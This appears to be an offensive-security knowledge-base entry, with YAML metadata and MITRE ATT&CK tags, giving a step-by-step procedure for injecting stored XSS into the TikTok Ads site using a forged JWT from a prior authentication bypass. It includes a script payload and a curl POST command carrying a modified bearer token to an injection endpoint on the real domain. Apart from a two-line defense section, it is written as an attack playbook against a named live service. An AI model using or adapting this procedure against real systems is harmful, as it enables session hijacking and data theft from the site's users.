---
tags:
  - xss
  - stored-xss
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 8e21b85b-0013-4847-b27e-2f5dddcf4411
created_at: '2025-12-11T03:47:56.581Z'
updated_at: '2025-12-11T03:47:56.581Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059.007]]'
---
# Inject Stored XSS via TikTok Ads

## Summary

This procedure injects malicious scripts into TikTok Ads using access gained from JWT misverification, resulting in site-wide stored XSS that can execute arbitrary code for multiple users.

## Description

With bypassed authentication, attackers can post content containing XSS payloads that are stored and rendered without sanitization. This affects the entire TikTok Ads site, potentially leading to session hijacking or data theft.

## Requirements

1. Prior authentication bypass access
2. Ability to send POST requests to injection endpoints
3. XSS payload crafting knowledge

## Defense

Defensive measures and detection strategies:

- Implement input sanitization and output encoding
- Use Content Security Policy (CSP) to restrict script execution

## Objectives

1. Inject persistent malicious script
2. Achieve site-wide execution
3. Demonstrate impact on users

## Instructions

### Step 1: Prepare XSS Payload

**Context**: Craft a simple alert payload or more advanced script.

> Example payload: <script>alert("XSS")</script>

### Step 2: Inject Payload via API

**Context**: Use the bypassed token to post the payload.

**Command** ([[commands/curl-xss-injection]]):
```bash
curl -H "Authorization: Bearer [modified-jwt]" -d '{"content": "<script>alert("XSS")</script>"}' https://ads.tiktok.com/api/inject -X POST
```

> Verify by loading the page and checking for alert execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques

## Commands Used

- [[commands/curl-xss-injection]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[commands/curl-xss-injection]]
- [[commands/curl-xss-injection]]
